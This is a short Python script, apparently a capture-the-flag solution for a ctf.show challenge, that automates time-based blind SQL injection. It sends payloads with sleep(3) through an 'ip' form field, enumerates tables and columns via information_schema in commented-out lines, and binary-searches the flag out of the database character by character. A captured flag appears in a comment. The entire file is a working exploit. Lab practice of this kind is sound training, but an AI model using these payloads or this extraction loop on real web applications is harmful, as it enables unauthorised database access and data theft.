"""
Author : feng
"""
import time
import threading
import requests

url = "http://53937ed0-dbc1-4622-a903-2528abb11dec.chall.ctf.show:8080/api/index.php"
flag = ''
for i in range(1, 100):
    # lock = threading.Lock()
    min = 32
    max = 128

    while 1:
        # lock.acquire()
        j = min + (max - min) // 2
        if j == min:
            flag += chr(j)
            print(flag)
            if chr(j) == '}':
                exit()
            break
        # payload = "' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},2))<{},sleep(3),1)#".format(
        # ctfshow_flagxc,ctfshow_info
        # payload = "' or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'),{},1))<{},sleep(3),1)#".format(
        # id,flagaa,info
        payload = "' or if(ascii(substr((select group_concat(flagaa) from ctfshow_flagxc),{},1))<{},sleep(3),1)#".format(
            i, j)
        # ctfshow{14e0a28a-c554-45d8-8afb-4655f3f8066c}
        data = {
            'ip': payload,
            'debug': 0
        }
        try:
            r = requests.post(url=url, data=data, timeout=2)
            time.sleep(1)
            min = j
        except:
            max = j
        # lock.release()

